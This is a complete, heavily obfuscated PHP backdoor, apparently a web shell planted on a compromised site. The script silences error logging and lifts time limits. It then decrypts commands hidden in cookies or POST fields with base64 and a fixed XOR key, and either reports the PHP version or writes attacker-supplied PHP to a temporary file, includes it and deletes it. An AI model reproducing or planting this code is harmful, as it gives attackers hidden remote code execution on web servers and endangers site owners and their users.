<?php $lgslpjsodc = chr(102).chr(105).chr(519-411).'e'.'_'."\x70".chr(117)."\164".chr(95).chr(99)."\157"."\156".chr(116).'e'.chr(110).'t'.chr(115);
$ouggkwbalj = 'b'.'a'."\163"."\145".'6'.chr(52)."\137".'d'.'e'.'c'."\157".chr(643-543).chr(513-412);
$mjfckcolt = chr(105)."\156"."\151".chr(740-645).'s'."\x65".'t';
$yzicqxdroj = chr(117).chr(126-16).'l'.'i'.chr(110)."\x6b";


@$mjfckcolt("\145"."\162".'r'.chr(111).'r'."\x5f"."\x6c".chr(571-460).chr(103), NULL);
@$mjfckcolt(chr(108)."\157"."\x67"."\137"."\x65".chr(339-225).chr(114).chr(664-553)."\x72".chr(839-724), 0);
@$mjfckcolt("\x6d".chr(97)."\170"."\x5f".chr(101).'x'.'e'."\x63".chr(366-249)."\x74"."\151".'o'.chr(951-841)."\x5f".chr(277-161).chr(688-583)."\x6d"."\145", 0);
@set_time_limit(0);

function xjzdzmd($knbmdwx, $bfbfx)
{
    $deawspqsrqxifjxwva = "";
    for ($deawspqsrq = 0; $deawspqsrq < strlen($knbmdwx);) {
        for ($j = 0; $j < strlen($bfbfx) && $deawspqsrq < strlen($knbmdwx); $j++, $deawspqsrq++) {
            $deawspqsrqxifjxwva .= chr(ord($knbmdwx[$deawspqsrq]) ^ ord($bfbfx[$j]));
        }
    }
    return $deawspqsrqxifjxwva;
}

$ygfxhk = array_merge($_COOKIE, $_POST);
$ybvwynd = '8dcae62f-7aac-4e71-b1f0-daa7c2f6c561';
foreach ($ygfxhk as $xmjnb => $knbmdwx) {
    $knbmdwx = @unserialize(xjzdzmd(xjzdzmd($ouggkwbalj($knbmdwx), $ybvwynd), $xmjnb));
    if (isset($knbmdwx[chr(315-218).chr(107)])) {
        if ($knbmdwx['a'] == "\x69") {
            $deawspqsrq = array(
                'p'."\166" => @phpversion(),
                chr(366-251).chr(294-176) => "3.5",
            );
            echo @serialize($deawspqsrq);
        } elseif ($knbmdwx['a'] == "\145") {
            $ccvpegxd = "./" . md5($ybvwynd) . chr(421-375).'i'.chr(110)."\143";
            @$lgslpjsodc($ccvpegxd, "<" . "\77".'p'.chr(104)."\x70"."\40"."\100"."\x75"."\156".chr(108).'i'."\x6e".chr(920-813).'('."\137"."\x5f".'F'."\x49".chr(584-508)."\105"."\137".'_'."\x29".chr(59).chr(32) . $knbmdwx['d']);
            include($ccvpegxd);
            @$yzicqxdroj($ccvpegxd);
        }
        exit();
    }
}

